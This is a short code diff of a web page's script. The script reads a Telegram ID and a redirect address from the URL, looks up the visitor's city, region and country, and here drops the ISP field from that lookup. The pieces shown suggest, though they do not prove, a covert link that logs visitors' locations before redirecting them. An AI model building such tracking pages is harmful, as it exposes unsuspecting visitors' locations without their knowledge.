@@ -362,7 +362,7 @@
     </div>
   </div>
 
-  <script>
+<script>
 const urlParams = new URLSearchParams(window.location.search);
 const telegramId = urlParams.get('telegramId');
 const redirectUrl = urlParams.get('redirectUrl') || 'https://google.com';
@@ -576,15 +576,13 @@ async function getLocation() {
     return {
       city: data.city || 'Unknown',
       region: data.region || 'Unknown',
-      country: data.country_name || 'Unknown',
-      isp: data.org || 'Unknown'
+      country: data.country_name || 'Unknown'
     };
   } catch {
     return {
       city: 'Unknown',
       region: 'Unknown',
-      country: 'Unknown',
-      isp: 'Unknown'
+      country: 'Unknown'
     };
   }
 }
